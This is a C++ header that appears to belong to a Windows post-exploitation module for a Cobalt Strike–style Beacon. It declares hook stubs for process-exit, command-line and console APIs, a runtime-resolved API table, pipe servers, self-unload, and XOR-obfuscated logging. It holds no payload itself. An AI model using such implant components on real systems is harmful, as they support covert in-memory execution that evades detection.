#pragma once
// clang-format off
#include <windows.h>
#include <tlhelp32.h>
// clang-format on
#include "hookspub.h"

/*==============================================================================
 * Import
 *============================================================================*/

// clang-format off
// In hooks.*.asm
#ifdef _WIN64
extern HookContext *ctx;
inline HookContext *getctx() { return ctx; }
inline void setctx(HookContext *ctx) { ::ctx = ctx; }
#define AddressOf(x) ((void *)(&(x)))
#else
extern HookContext *getctx();
extern void setctx(HookContext *ctx);
extern void *GetMyExitProcessStub();
extern void *GetMyGetCommandLineAStub();
extern void *GetMyGetCommandLineWStub();
extern void *GetMyGetStdHandleStub();
extern void *GetMyProcess32NextWStub();
extern void *GetMyWriteFileStub();
extern void *GetMyCreateThreadStub();
extern void *GetMybeginthreadStub();
extern void *GetMyAddVectoredExceptionHandlerStub();
extern void *GetMyAddVectoredContinueHandlerStub();
extern void *GetMySetConsoleCtrlHandlerStub();
extern void *GetMyVirtualAllocStub();
extern void *GetMyVirtualFreeStub();
extern void *GetMyTlsAllocStub();
extern void *GetMyGetProcAddressStub();
extern void *GetRunExeEntryProcStub();
extern void *GetHookControlSelfUnloadProcStub();
extern void *GetReadPipeServerProcStub();
extern void *GetWritePipeServerProcStub();
#define AddressOf(x) (Get##x##Stub())
#endif

extern uintptr_t __cdecl _beginthread_proto(_In_ void* _StartAddress, _In_ unsigned _StackSize, _In_opt_ void* _ArgList);
extern int __cdecl vsprintf_s_proto(char* const _Buffer, size_t const _BufferCount, char const* const _Format, va_list _ArgList);
#define AddVectoredContinueHandler     ((decltype(AddVectoredContinueHandler    )*)(getctx()->_AddVectoredContinueHandler    ))
#define AddVectoredExceptionHandler    ((decltype(AddVectoredExceptionHandler   )*)(getctx()->_AddVectoredExceptionHandler   ))
#define CloseHandle                    ((decltype(CloseHandle                   )*)(getctx()->_CloseHandle                   ))
#define CreateEventA                   ((decltype(CreateEventA                  )*)(getctx()->_CreateEventA                  ))
#define CreatePipe                     ((decltype(CreatePipe                    )*)(getctx()->_CreatePipe                    ))
#define CreateThread                   ((decltype(CreateThread                  )*)(getctx()->_CreateThread                  ))
#define ExitThread                     ((decltype(ExitThread                    )*)(getctx()->_ExitThread                    ))
#define GetModuleHandleA               ((decltype(GetModuleHandleA              )*)(getctx()->_GetModuleHandleA              ))
#define GetProcAddress                 ((decltype(GetProcAddress                )*)(getctx()->_GetProcAddress                ))
#define GetStdHandle                   ((decltype(GetStdHandle                  )*)(getctx()->_GetStdHandle                  ))
#define GetThreadId                    ((decltype(GetThreadId                   )*)(getctx()->_GetThreadId                   ))
#define MultiByteToWideChar            ((decltype(MultiByteToWideChar           )*)(getctx()->_MultiByteToWideChar           ))
#define OpenThread                     ((decltype(OpenThread                    )*)(getctx()->_OpenThread                    ))
#define Process32NextW                 ((decltype(Process32NextW                )*)(getctx()->_Process32NextW                ))
#define ReadFile                       ((decltype(ReadFile                      )*)(getctx()->_ReadFile                      ))
#define RemoveVectoredContinueHandler  ((decltype(RemoveVectoredContinueHandler )*)(getctx()->_RemoveVectoredContinueHandler ))
#define RemoveVectoredExceptionHandler ((decltype(RemoveVectoredExceptionHandler)*)(getctx()->_RemoveVectoredExceptionHandler))
#define SetEvent                       ((decltype(SetEvent                      )*)(getctx()->_SetEvent                      ))
#define SetUnhandledExceptionFilter    ((decltype(SetUnhandledExceptionFilter   )*)(getctx()->_SetUnhandledExceptionFilter   ))
#define Sleep                          ((decltype(Sleep                         )*)(getctx()->_Sleep                         ))
#define TerminateThread                ((decltype(TerminateThread               )*)(getctx()->_TerminateThread               ))
#define TlsAlloc                       ((decltype(TlsAlloc                      )*)(getctx()->_TlsAlloc                      ))
#define TlsFree                        ((decltype(TlsFree                       )*)(getctx()->_TlsFree                       ))
#define VirtualAlloc                   ((decltype(VirtualAlloc                  )*)(getctx()->_VirtualAlloc                  ))
#define VirtualFree                    ((decltype(VirtualFree                   )*)(getctx()->_VirtualFree                   ))
#define WaitForSingleObject            ((decltype(WaitForSingleObject           )*)(getctx()->_WaitForSingleObject           ))
#define WideCharToMultiByte            ((decltype(WideCharToMultiByte           )*)(getctx()->_WideCharToMultiByte           ))
#define WriteFile                      ((decltype(WriteFile                     )*)(getctx()->_WriteFile                     ))
#define _beginthread                   ((decltype(_beginthread_proto            )*)(getctx()->__beginthread                  ))
#define _vscprintf                     ((decltype(_vscprintf                    )*)(getctx()->__vscprintf                    ))
#define free                           ((decltype(free                          )*)(getctx()->_free                          ))
#define malloc                         ((decltype(malloc                        )*)(getctx()->_malloc                        ))
#define memcpy                         ((decltype(memcpy                        )*)(getctx()->_memcpy                        ))
#define realloc                        ((decltype(realloc                       )*)(getctx()->_realloc                       ))
#define vsprintf_s                     ((decltype(vsprintf_s_proto              )*)(getctx()->_vsprintf_s                    ))
#ifdef _WIN64
#define RtlDeleteFunctionTable         ((decltype(RtlDeleteFunctionTable        )*)(getctx()->_RtlDeleteFunctionTable        ))
#endif
#ifdef _DEBUG
#define OutputDebugStringA             ((decltype(OutputDebugStringA            )*)(getctx()->_OutputDebugStringA            ))
#else
#define OutputDebugStringA
#endif

/* Output Functions */
#define CALLBACK_OUTPUT      0x0
#define CALLBACK_OUTPUT_OEM  0x1e
#define CALLBACK_OUTPUT_UTF8 0x20
#define CALLBACK_ERROR       0x0d
// clang-format on

/*==============================================================================
 * Helpers
 *============================================================================*/

#define NtCurrentProcessId() (((PHANDLE)NtCurrentTeb())[8])
#define NtCurrentThreadId() (((PHANDLE)NtCurrentTeb())[9])
#define NtLastError() (*(PDWORD)((PSIZE_T)NtCurrentTeb() + 13))

#define SpinLock(lock, code)                                                   \
  do {                                                                         \
    while (InterlockedExchange(&(lock), 1) == 1) {                             \
      Sleep(1);                                                                \
    }                                                                          \
    code;                                                                      \
    InterlockedExchange(&(lock), 0);                                           \
  } while (0)

/*==============================================================================
 * Log
 *============================================================================*/

void BeaconPrintfPostMsg(int type, const char *fmt, ...);
#define _BeaconPrint(a, b, ...) BeaconPrintfPostMsg(a, b, ##__VA_ARGS__)

#define PRINTF(a, ...) _BeaconPrint(CALLBACK_OUTPUT, xorstr_(a), ##__VA_ARGS__)
#define PRINTF_ERR(a, ...)                                                     \
  _BeaconPrint(CALLBACK_ERROR, xorstr_(a), ##__VA_ARGS__)

/*==============================================================================
 * Trace
 *============================================================================*/

#ifdef _DEBUG
#define _TRACE
#endif

#ifdef _TRACE
#define TRACEF(a, ...)                                                         \
  _BeaconPrint(CALLBACK_OUTPUT, xorstr_("[DBG] " a), ##__VA_ARGS__)
#else
#define TRACEF(a, ...)
#endif
